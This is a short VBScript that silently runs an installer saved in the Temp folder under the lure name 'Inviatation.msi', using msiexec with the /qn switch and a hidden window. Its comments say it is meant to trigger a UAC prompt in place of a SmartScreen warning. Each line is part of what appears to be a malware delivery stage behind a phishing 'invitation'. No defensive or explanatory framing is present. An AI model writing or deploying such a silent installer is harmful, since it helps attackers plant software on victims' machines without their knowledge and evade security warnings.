Dim objShell, localPath
Set objShell = CreateObject("WScript.Shell")

' Path to the downloaded MSI (saved in Temp folder)
localPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Inviatation.msi"

' Run as Administrator (This triggers the UAC prompt instead of SmartScreen)
' /qn ensures total silence during installation
objShell.Run """msiexec.exe"" /i """ & localPath & """ /qn", 0, True